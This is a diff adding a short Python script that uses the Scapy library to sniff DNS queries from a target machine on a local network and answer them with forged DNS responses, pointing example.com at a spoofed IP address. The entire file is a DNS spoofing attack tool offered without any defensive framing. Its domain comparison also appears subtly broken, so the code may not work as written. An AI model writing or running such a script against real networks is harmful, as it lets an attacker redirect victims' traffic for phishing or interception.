@@ -1,0 +1,20 @@
+from scapy.all import *
+
+# Define the target domain and IP addresses
+target_domain = "example.com"
+spoofed_ip = "192.0.2.1"
+target_ip = "192.168.1.2"
+dns_server_ip = "192.168.1.1"
+
+# Function to create and send a spoofed DNS response
+def dns_response(pkt):
+    if pkt.haslayer(DNS) and pkt.getlayer(DNS).qd.qname == target_domain:
+        spoofed_pkt = IP(src=pkt[IP].dst, dst=pkt[IP].src) / \
+                      UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport) / \
+                      DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, 
+                          an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=64, rdata=spoofed_ip))
+        send(spoofed_pkt)
+        print(f"Sent spoofed DNS response: {target_domain} -> {spoofed_ip}")
+
+# Sniff DNS requests from the target IP and call the dns_response function
+sniff(filter=f"udp port 53 and ip src {target_ip}", prn=dns_response)
